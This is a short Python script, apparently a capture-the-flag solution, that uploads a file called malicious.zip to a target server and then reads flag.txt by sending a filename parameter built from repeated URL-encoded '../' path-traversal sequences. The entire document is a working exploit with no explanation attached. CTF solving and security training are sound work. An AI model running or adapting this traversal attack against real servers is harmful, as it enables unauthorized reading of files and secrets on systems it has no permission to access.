import requests
import os

target_url = "https://{}:{}/".format(os.getenv("CTF4B_HOST"),
                                     os.getenv("CTF4B_PORT"))
s = requests.Session()
s.post(target_url, files={
    "file": open("malicious.zip", 'rb')
})

print(s.get(target_url + "?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag.txt").text)
